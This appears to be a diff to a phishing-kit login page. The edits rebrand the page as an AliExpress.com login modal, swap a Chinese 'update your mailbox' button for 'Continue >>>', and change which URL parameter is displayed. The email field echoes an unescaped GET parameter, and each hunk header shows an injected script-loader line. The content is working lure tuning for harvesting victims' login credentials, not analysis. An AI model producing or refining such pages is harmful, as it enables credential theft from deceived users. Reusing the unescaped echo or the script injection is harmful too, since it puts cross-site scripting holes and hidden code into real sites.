@@ -420,7 +420,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
             <div class="modal-content">
                 <div class="modal-header">
                     <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
-                    <h4 class="modal-title">Login to continue</h4>
+                    <h4 class="modal-title">Welcome to AliExpress.com | Login to continue</h4>
                 </div>               
                 
                 <div class="modal-body">                                       
@@ -431,7 +431,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
 				<br><br>
 
 				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['login']; ?>" placeholder="Username">
-				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?></font>		
+				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['pdf']; ?></font>		
 
 				<p>
 
@@ -442,7 +442,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
 
 				</p><p>
 
-				<input type="submit" value="&#26356;&#26032;&#24744;&#30340;&#37038;&#31665;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				<input type="submit" value="Continue >>>;" style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
 				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
 				-khtml-border-radius: 4px; border-radius: 4px;">				
 	
